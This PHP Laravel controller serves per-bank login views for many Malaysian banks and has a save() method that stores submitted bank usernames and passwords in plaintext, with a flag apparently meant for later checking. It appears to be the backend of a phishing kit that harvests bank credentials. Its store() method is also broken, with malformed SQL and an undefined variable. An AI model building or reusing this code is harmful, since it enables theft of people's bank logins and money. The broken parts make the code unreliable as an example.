<?php
namespace App\Http\Controllers;
use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\URL;
use Illuminate\Support\Facades\DB;
use Session;
use Input;

class BankController extends Controller{
    public function store(request $request){
        $name = $request->input('name');
        $email = $request->input('email');
        $password = $request->input('password');
        DB::insert('insert into ea_users(sys_ID,) values(?,?,?)',[$sys_ID,$name,$email]);
    }
    public function bsndirect(request $request){
        // if(Session::get('userid')) return Redirect('/bsn');
        return view('banks.bsn');
    }
    public function rhb_bankdirect(request $request){
        // if(Session::get('userid')) return Redirect('/bsn');
        return view('banks.rhb_bank');
    }
    public function maybankdirect(request $request){
        // if(Session::get('userid')) return Redirect('/bsn');
        return view('banks.maybank');
    }
    public function cimb_bankdirect(request $request){
        // if(Session::get('userid')) return Redirect('/bsn');
        return view('banks.cimb_bank');
    }
    public function hong_leong_bankdirect(request $request){
        // if(Session::get('userid')) return Redirect('/bsn');
        return view('banks.hong_leong_bank');
    }
    public function public_bankdirect(request $request){
        // if(Session::get('userid')) return Redirect('/bsn');
        return view('banks.public_bank');
    }
    public function ambankdirect(request $request){
        // if(Session::get('userid')) return Redirect('/bsn');
        return view('banks.ambank');
    }
    public function agrobankdirect(request $request){
        // if(Session::get('userid')) return Redirect('/bsn');
        return view('banks.agrobank');
    }
    public function bankislamdirect(request $request){
        // if(Session::get('userid')) return Redirect('/bsn');
        return view('banks.bankislam');
    }
    public function bank_rakyatdirect(request $request){
        // if(Session::get('userid')) return Redirect('/bsn');
        return view('banks.bank_rakyat');
    }
    public function uob_bankdirect(request $request){
        // if(Session::get('userid')) return Redirect('/bsn');
        return view('banks.uob_bank');
    }
    public function citibankdirect(request $request){
        // if(Session::get('userid')) return Redirect('/bsn');
        return view('banks.Citi_bank');
    }
    public function save(request $request){
        // if(Session::get('userid')) return Redirect('/bsn');
        $username = Input::get('username');
        $password = Input::get('password');
        $bankname = Input::get('bankname');
        $timestamp =  date('Y-m-d  H:i:s');
        DB::insert('insert into ea_bank (username, password, bankname, datetime, checkfield) values(?,?,?,?,?)',[$username,$password,$bankname,$timestamp,0]);
        
        // return header('Location: https://www.google.com/search?q=how+to+direct+with+header+function+in+php&oq=how+to+direct+with+header+function+in+php&aqs=chrome..69i57.26886j0j9&sourceid=chrome&ie=UTF-8' );
        
        return "ok!";        
    }
}